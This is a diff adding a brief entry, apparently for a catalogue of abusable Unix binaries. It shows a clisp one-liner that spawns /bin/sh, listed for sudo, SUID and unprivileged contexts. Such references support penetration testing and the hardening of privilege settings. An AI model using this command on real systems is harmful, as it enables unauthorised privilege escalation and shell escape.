@@ -1,0 +1,14 @@
+clisp
+=====
+
+Shell
+-----
+
+[Sudo]
+    clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
+
+[SUID]
+    clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
+
+[Unprivileged]
+    clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
